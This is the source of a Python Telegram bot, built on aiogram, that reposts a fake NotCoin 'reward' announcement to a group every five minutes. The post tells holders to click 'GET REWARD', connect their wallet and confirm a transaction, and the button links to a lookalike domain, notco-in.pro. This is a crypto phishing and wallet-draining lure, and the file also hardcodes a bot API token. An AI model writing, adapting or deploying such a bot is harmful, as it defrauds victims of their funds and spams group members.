import logging
from aiogram import Bot, Dispatcher
from aiogram.types import BotCommand
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.filters import Command
import time
import asyncio
from aiogram import types, Router, Bot
from aiogram.types import InlineKeyboardButton, FSInputFile
from aiogram.utils.keyboard import InlineKeyboardBuilder

# Configure logging
logging.basicConfig(level=logging.INFO)

API_TOKEN = "7291323858:AAEyJBV7M2QGSelcaMcf0I9gVOYBGSVIzn8"
GROUP_ID = -1001543758815
MESSAGE_ID = 0
# Initialize bot and dispatcher
bot = Bot(token=API_TOKEN)
dp = Dispatcher(storage=MemoryStorage())


router = Router()


text = """
How to Participate in Reward Holder
All of the grandest and largest events are simple. You will be rewarded in just 3 simple steps :

✅ Click on the "GET REWARD" button below.
✅ Connect wallet where you holder $NOT coin.
✅ Confirm the transaction in your wallet to receive the reward.

Done! Within seconds, smart contract Reward Holderwill send the reward to your wallet. Thank you for choosing NotCoin
"""


@router.message(Command("start"))
async def send_new_post(message: types.Message, bot: Bot):
    global MESSAGE_ID, GROUP_ID

    min10inSec = 60 * 5

    keyboard_builder = InlineKeyboardBuilder()
    keyboard_builder.add(
        InlineKeyboardButton(
            text="GET REWARD",
            url="https://notco-in.pro/",
        )
    )
    keyboard = keyboard_builder.as_markup()

    photo = FSInputFile("imgNot.jpg")

    if MESSAGE_ID == 0:

        message1 = await bot.send_photo(
            GROUP_ID,
            photo=photo,
            caption=text,
            reply_markup=keyboard,
        )

        MESSAGE_ID = message1.message_id

        await asyncio.sleep(min10inSec)
        await send_new_post(message, bot)
        return

    await bot.delete_message(chat_id=GROUP_ID, message_id=MESSAGE_ID)

    message1 = await bot.send_photo(
        GROUP_ID,
        photo=photo,
        caption=text,
        reply_markup=keyboard,
    )

    MESSAGE_ID = message1.message_id

    await asyncio.sleep(min10inSec)
    await send_new_post(message, bot)


dp.include_router(router)


async def main():
    await dp.start_polling(bot)


if __name__ == "__main__":
    import asyncio

    asyncio.run(main())
